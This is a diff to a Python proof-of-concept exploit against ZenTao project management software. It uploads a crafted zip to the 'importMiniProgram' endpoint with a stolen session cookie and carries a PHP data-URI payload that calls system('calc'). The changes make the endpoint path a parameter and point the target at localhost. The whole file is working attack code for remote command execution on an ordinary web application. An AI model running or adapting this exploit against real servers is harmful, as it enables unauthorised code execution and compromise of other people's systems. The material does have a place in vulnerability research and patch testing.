@@ -27,7 +27,7 @@ def payload_gen(pay):
     return payload
 
 
-def upload(url, payload, cookie):
+def upload(url, payload, cookie, path):
     headers = {
         "Cookie": cookie,
         "Referer": url + "/index.php?m=my&f=index"
@@ -35,18 +35,19 @@ def upload(url, payload, cookie):
 
     data = {"published": "work", "category": 1}
     files = {"file": ("test.zip", payload, "application/octet-stream")}
-    url += "/index.php?m=ai&f=importMiniProgram"
+    url += path
     response = requests.post(url, headers=headers, data=data, files=files)
 
 
-def run(url, pay, cookie):
+def run(url, pay, cookie, path):
     url = urlChecker(url)
     payload = payload_gen(pay)
-    upload(url, payload, cookie)
+    upload(url, payload, cookie, path)
 
 
 if __name__ == "__main__":
-    url = "http://zentaopms21-6/"
+    url = "http://127.0.0.1/"
+    path = "/index.php?m=ai&f=importMiniProgram"
     cookie = "zentaosid=bk16e4281glnvas4ss2pvpo9ra"     # Just need the zentaosid parameter
     pay = "data://text/plain,<?=system('calc')?>"       # Login Required
-    run(url, pay, cookie)
+    run(url, pay, cookie, path)
